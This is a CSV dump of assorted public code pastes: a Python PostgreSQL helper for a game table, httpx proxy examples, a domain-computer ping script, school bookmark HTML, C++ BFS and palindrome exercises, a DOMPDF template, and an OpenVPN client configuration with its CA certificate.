id,title,username,language,date,content
suUpVVVx,sql_trains,SillyWolfy,Python,Thursday 11th of April 2024 10:02:16 AM CDT,"import psycopg2
def get_conn():
    return psycopg2.connect(dbname='postgres', user='postgres', password='1234', host='localhost')


def create_table_if_not_exist():
    # Подключаемся к базе данных
    conn = get_conn()
    c = conn.cursor()
    # Создание таблицы, если она не существует
    c.execute('''CREATE TABLE IF NOT EXISTS trains (TEAM bigint, ROUND integer, TRY integer, OR_NUM integer, CUR_NUM integer, SCORE integer)''')
    conn.commit()  # Фиксация изменений

    conn.close()


def check_user_exists(user_id):
    try:
        conn = get_conn()
        with conn.cursor() as cur:
            # Проверяем существование пользователя с заданным user_id
            cur.execute(""SELECT COUNT(*) FROM trains WHERE TEAM = %s"", (user_id,))
            count = cur.fetchone()[0]  # Получаем количество записей с user_id
            if count > 0:
                return 1  # Пользователь существует
            else:
                return 0  # Пользователь не существует
    finally:
        conn.close()

def update_round(user_id, new_original_place):
    try:
        conn = get_conn()
        with conn.cursor() as cur:
            cur.execute(""UPDATE trains SET ROUND=ROUND+1, TRY=6, OR_NUM=%s, CUR_NUM=%s WHERE TEAM=%s"",
              (new_original_place, new_original_place, user_id))

            conn.commit()  # Фиксация изменений

    finally:
        conn.close()

def minus_try(user_id):
    try:
        conn = get_conn()  # Предполагается, что эта функция возвращает соединение с базой данных
        with conn.cursor() as cur:
            # Обратите внимание, что аргументы после SQL запроса передаются в виде кортежа (user_id,)
            cur.execute(""UPDATE trains SET TRY=TRY-1 WHERE TEAM=%s"", (user_id,))

        conn.commit()  # Фиксация изменений
    finally:
        if conn:
            conn.close()
def add_score(user_id):
    try:
        conn = get_conn()
        with conn.cursor() as cur:
            cur.execute(""UPDATE trains SET SCORE=SCORE+1 WHERE TEAM=%s"", (user_id,))

        conn.commit()  # Фиксация изменений

    finally:
        conn.close()

def update_cur_num(updated_current_place, user_id):
    try:
        conn = get_conn()
        with conn.cursor() as cur:
            cur.execute(""UPDATE trains SET CUR_NUM=%s WHERE TEAM=%s"", (updated_current_place, user_id,))

        conn.commit()  # Фиксация изменений

    finally:
        conn.close()
def get_user_data(user_id):
    try:
        conn = get_conn()
        with conn.cursor() as cur:
            cur.execute(""SELECT * FROM trains WHERE TEAM = %s"", (user_id,))
            user_data = cur.fetchone()  # Получаем первую строку результата
            return user_data  # Возвращаем значения каждой колонки по user_id
    finally:
        conn.close()

def add_player(user_id):
    try:
        conn = get_conn()
        with conn.cursor() as c:
            c.execute(""INSERT INTO trains (TEAM, ROUND, TRY, OR_NUM, CUR_NUM, SCORE) VALUES (%s, 1, 6, 0, 0, 0)"",
            (user_id,))
        conn.commit()  # Фиксация изменений

    finally:
        conn.close()
def update_orig_num(user_id, new_orig_num):
    try:
        conn = get_conn()
        with conn.cursor() as cur:
            cur.execute(""UPDATE trains SET OR_NUM=%s WHERE TEAM=%s"", (new_orig_num, user_id,))

        conn.commit()  # Фиксация изменений

    finally:
        conn.close()"
wqM5ihLE,Untitled,dereksir,Python,Thursday 11th of April 2024 09:50:02 AM CDT,"import httpx

# create a client with the specified proxy
with httpx.Client(proxy=""http://216.137.184.253:80"") as client:
    # make requests using the client
    r = client.get(""https://httpbin.io/ip"")

print(r.text)"
gHRVnWvZ,список_компов_в_домене,Wintersham,Python,Thursday 11th of April 2024 09:43:17 AM CDT,"import ms_active_directory , re , os
from ping3 import ping, verbose_ping
kompy_domena = []
n = 0
j = -1
os.path.join('c','Users','BuharskyAA','Documents','ad_pcs.csv')
data = open('c:\\Users\\BuharskyAA\\Documents\\ad_pcs.csv','r')
for line in data:
   kompy_domena.append(line.split())
#    n += 1
#    kompy_domena.append(n)
pc_online = []
for i in range (len(kompy_domena)):
   print(str(kompy_domena[i][n]))
   verbose_ping(str(kompy_domena[i][n]))
   pinganem = ping(kompy_domena[i][n])
   if type (pinganem) == float:
        pinganem=int(pinganem)
        print(type(pinganem))
        print(pinganem)
        pc_online.append(kompy_domena[i][n])
        print(pc_online)

#    pinganem.round()
#          print(((pinganem)))
#          break
#    if result_of_ping[0] == 0:
#       pc_online.append(kompy_domena[i][n])
#       del result_of_ping[0]
#       print(pc_online)
#       break
#    else:
#       continue
# print(pc_online)
# print((str(kompy_domena[3])))
# print(len(kompy_domena))
# # imena_kompov = re.findall(r'[A-Z0-9]',str(kompy_domena))
# # print(imena_kompov)
# ping(str(kompy_domena[3]))
# param = '-n' if os.sys.platform().lower()=='win32' else '-c'
# hostname = kompy_domena[3] #example
# response = os.system(f""ping {param} 1 {hostname}"")
# #and then check the response...
# if response == 0:
#   print(f""{hostname} is up!"")
# else:
#   print(f""{hostname} is down!"")"
d9DWMpgt,Untitled,MR_OBRIEN,HTML,Thursday 11th of April 2024 09:37:38 AM CDT,"School Websites for Bookmark Bar

<a href=“https://teams.microsoft.com/v2/”>Microsoft Teams</a>
<a href=“https://www.microsoft365.com/launch/word?auth=2”>Microsoft Word</a>
<a href=“https://dcdsb.edsby.com/”>Durham Catholic District School Board (DCDSB)</a>
<a href=“https://durhamrc.elearningontario.ca/d2l/home”>Durham Region College (DRC) eLearning Portal</a>
<a href=“https://www.microsoft365.com/launch/onenote?auth=2”>Microsoft OneNote</a>
<a href=“https://www.microsoft365.com/launch/powerpoint?auth=2”>Microsoft PowerPoint</a>
<a href=“https://www.canva.com/”>Canva</a>"
B6bgNWXM,Untitled,MR_OBRIEN,HTML,Thursday 11th of April 2024 09:32:27 AM CDT,"<!-- Made by Distance // Chris // HTMLCoding(Pastebin) -->
<!DOCTYPE html>
<html>
  <head>
    <title>School Websites for Bookmark Bar</title>
  </head>
<!-- How to HyperLink: Use a and href then put the link in commas then use > and then put the name you want and end it with </a> -->
<!-- Example -->
<a href=""https://teams.microsoft.com/v2/"">Teams</a>
<a href=""https://www.microsoft365.com/launch/word?auth=2"">Microsoft Word</a>
<a href=""https://dcdsb.edsby.com/"">EDSBY</a>
<a href=""https://durhamrc.elearningontario.ca/d2l/home"">D2L</a>
<a href=""https://www.microsoft365.com/launch/onenote?auth=2”"">OneNote</a>
<a href=""https://www.microsoft365.com/launch/powerpoint?auth=2”"">Microsoft PowerPoint</a>
<a href=""https://www.canva.com/”"">Canva</a>
</html>"
V8V5wNit,Untitled,dereksir,Bash,Thursday 11th of April 2024 09:30:06 AM CDT,"{
  ""origin"": ""216.137.184.253:40335""
}"
tb0HJuht,Lesson27,smatskevich,C++,Thursday 11th of April 2024 09:05:59 AM CDT,"#include <iostream>
#include <queue>
#include <vector>

#define all(x) x.begin(), x.end()
using namespace std;

void BFS(int s, vector<vector<int>>& g, vector<int>& r, vector<int>& pi) {
  int n = r.size();
  queue<int> q;
  q.push(s);
  r[s] = 0;
  while (!q.empty()) {
    int u = q.front(); q.pop();
    for (int v : g[u]) {
      if (r[v] == INT_MAX) {
        r[v] = r[u] + 1;
        pi[v] = u;
        q.push(v);
      }
    }
  }
}

int main() {
  int n, m; cin >> n >> m;
  vector<vector<int>> g(n);
//  for (int i = 0; i < m; ++i)
  while (m--) {
    int u, v; cin >> u >> v;  --u; --v;
    g[u].push_back(v);
    g[v].push_back(u);
  }
  int s; cin >> s; --s;
  vector<int> r(n, INT_MAX), pi(n, -1);
  BFS(s, g, r, pi);

  for (int u = 0; u < n; ++u) {
    cout << ""Vertex "" << u + 1 << "": dist = "" << r[u] << "", path = ["";
    vector<int> path;
    for (int v = u; v != -1; v = pi[v]) path.push_back(v);
    reverse(all(path));
    for (int v : path) cout << v + 1 << (v == u ? ""]\n"" : "", "");
  }
  return 0;
}
"
aWwU6XLU,Untitled,dereksir,Python,Thursday 11th of April 2024 09:02:49 AM CDT,"import httpx

# define your proxy settings
proxies = {
    ""http://"": ""http://216.137.184.253:80"",
    ""https://"": ""http://216.137.184.253:80""
}

# make a request with the specified proxy
r = httpx.get(""https://httpbin.io/ip"", proxies=proxies)

print(r.text)"
pHZryJA7,Longest Palindromic Substring,bobbye,Python,Thursday 11th of April 2024 09:02:03 AM CDT,"class Solution:
    def longestPalindrome(self, s: str) -> str:
        if not s:
            return """"

        def expand_around_center(s: str, left: int, right: int):
            while left >= 0 and right < len(s) and s[left] == s[right]:
                left -= 1
                right += 1
            return right - left - 1


        start = 0
        end = 0

        for i in range(len(s)):
            odd = expand_around_center(s, i, i)
            even = expand_around_center(s, i, i + 1)
            max_len = max(odd, even)
            
            if max_len > end - start:
                start = i - (max_len - 1) // 2
                end = i + max_len // 2
        
        return s[start:end+1]"
CbRVieQf,Untitled,dereksir,Python,Thursday 11th of April 2024 08:50:16 AM CDT,"import httpx

# define your proxy settings
proxies = {
    ""http://"": ""http://216.137.184.253:80"",
    ""https://"": ""http://216.137.184.253:80""
}"
qyepa5xi,Untitled,dereksir,Python,Thursday 11th of April 2024 08:40:45 AM CDT,"import httpx

r = httpx.get(""https://httpbin.io/ip"")
print(r.text)"
eRFhavm7,DOMPDF,pishpeter,PHP,Thursday 11th of April 2024 08:28:35 AM CDT,"<html>
<head>
    <style>
        @page { margin: 0px; }
        body { margin: 0px; }

        /* Style for header */
        .header {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            height: 150px; /* Adjust height as needed */
            background-color: #f0f0f0;
            text-align: center;
            line-height: 100px;
            overflow: hidden;
        }
        
        /* Style for footer */
        .footer {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%; /* Set width to 100% */
            height: 200px; /* Adjust height as needed */
            background-color: #f0f0f0;
            text-align: center;
            line-height: 100px;
            overflow: hidden;
        }
        
        /* Style for images */
        .header img,
        .footer img {
            width: 100%;
            height: 100%;
            display: block;
            margin: auto;
        }

        /* Style for heading */
        .heading {
            text-align: center;
            margin-top: 200px; /* Adjust margin as needed */
        }
    </style>
</head>
<body>
    <div class=""header""><img src=""https://bidding.kaihoeastafrica.co.ke/assets/img/pdf/header.png"" alt=""Header Image""></div>
    <div class=""footer""><img src=""https://bidding.kaihoeastafrica.co.ke/assets/img/pdf/footer.png"" alt=""Footer Image""></div>
    <div class=""heading"">
        <h1>PDF Heading</h1>
    </div>
    <div class=""content"">
        <h2>Main Content</h2>
        <!-- Your content goes here -->
    </div>
</body>
</html>
"
sV8frWaf,Bruxelles,Netsemfim,Bash,Thursday 11th of April 2024 08:28:25 AM CDT,"client
dev tun
proto udp
remote bru-c16.vpn.wlvpn.com 1194
remote bru-c17.vpn.wlvpn.com 1194
remote bru-c18.vpn.wlvpn.com 1194
remote bru-c19.vpn.wlvpn.com 1194
remote bru-c20.vpn.wlvpn.com 1194
remote bru-c21.vpn.wlvpn.com 1194
remote bru-c22.vpn.wlvpn.com 1194
remote bru-c23.vpn.wlvpn.com 1194
remote bru-c24.vpn.wlvpn.com 1194
remote bru-c25.vpn.wlvpn.com 1194
remote bru-c26.vpn.wlvpn.com 1194
remote bru-c27.vpn.wlvpn.com 1194
remote bru-c13.vpn.wlvpn.com 1194
remote bru-c14.vpn.wlvpn.com 1194
remote bru-c15.vpn.wlvpn.com 1194
remote bru-c28.vpn.wlvpn.com 1194
remote bru-c29.vpn.wlvpn.com 1194
remote bru-c30.vpn.wlvpn.com 1194
remote bru-c31.vpn.wlvpn.com 1194
remote bru-c32.vpn.wlvpn.com 1194
remote-random
resolv-retry infinite
nobind
persist-key
persist-tun
persist-remote-ip
<ca>
-----BEGIN CERTIFICATE-----
MIIESjCCAzKgAwIBAgIJAKSqvk2CSdJGMA0GCSqGSIb3DQEBDQUAMHUxCzAJBgNV
BAYTAlVTMQwwCgYDVQQIEwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoGA1UEChMDVlBO
MQwwCgYDVQQLEwNWUE4xDDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMDVlBOMRIwEAYJ
KoZIhvcNAQkBFgNWUE4wIBcNMjIwNTA5MjA0NTA2WhgPMjA4MjA0MjQyMDQ1MDZa
MHUxCzAJBgNVBAYTAlVTMQwwCgYDVQQIEwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoG
A1UEChMDVlBOMQwwCgYDVQQLEwNWUE4xDDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMD
VlBOMRIwEAYJKoZIhvcNAQkBFgNWUE4wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
ggEKAoIBAQDJSvYEDPaAcZpeuLqtYykqpy9VNfcg5IsR8FZ/V9vbMLDHT4YUwbbn
xiQ4KJCGj9g5fnxsmmywYjjY7NmK1KKxNWlc0gF6XMZQ90qDHSpREaANb7t47JIl
gKfURSdwSUkIe3WyjRJt91CnEDzxVkwf18U4q0tjmoceLR2teb/BnL7NbtN9Xktx
7Tjq+/Yz0jn8qjjNnlWHqNOjZWsJBHDyChcHk0B1TkPvqVWFYrhnO3jCgjydFbkS
/cBYTDmhfzmPkHRNj2cSLmPS81gG4zF/8aIs7wzwsIc9fQdgGIsONl6wkK+4be9/
CcBjkIlCo2O5+macXeK+xoXR0Z6jniRZAgMBAAGjgdowgdcwDAYDVR0TBAUwAwEB
/zAdBgNVHQ4EFgQUF58B5L6R0n/5TGnCqCrIQHBjNqkwgacGA1UdIwSBnzCBnIAU
F58B5L6R0n/5TGnCqCrIQHBjNqmheaR3MHUxCzAJBgNVBAYTAlVTMQwwCgYDVQQI
EwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoGA1UEChMDVlBOMQwwCgYDVQQLEwNWUE4x
DDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMDVlBOMRIwEAYJKoZIhvcNAQkBFgNWUE6C
CQCkqr5NgknSRjANBgkqhkiG9w0BAQ0FAAOCAQEAMjkx4HQoLkLVMix6j6HVf8Lr
lKnbDlMx3gYfkD8J5LhTrf8JezB07rSialwiF7lvs3+urvQQdUs5tZCARRDpQANR
b8XzxbDu3oO4eOOxiDPnHutZv04/rN3Y/s3kSrJEwXxnWDLSzn9IsJtFtV+oHwan
ijRI4jaTBAzaqpFzq1Ffm1O1PrFfhwjb4aEyahMXCU8xRavBGKu7EeXZ78lXJVqg
0q3hbTISxRXSa63JgwxZnXcHIyeO4V/bZIcJvIei17xlc7dLDHPdnyQtrD07+AEH
qioNZsFRPJqf8KwmVCEIJq38cM7nSRXrrZ36w9P4sMBRHABQBre2DIqdo9hoeA==
-----END CERTIFICATE-----
</ca>
tls-client
remote-cert-tls server
auth-user-pass
compress lzo
verb 3
auth SHA256
cipher AES-256-CBC
"
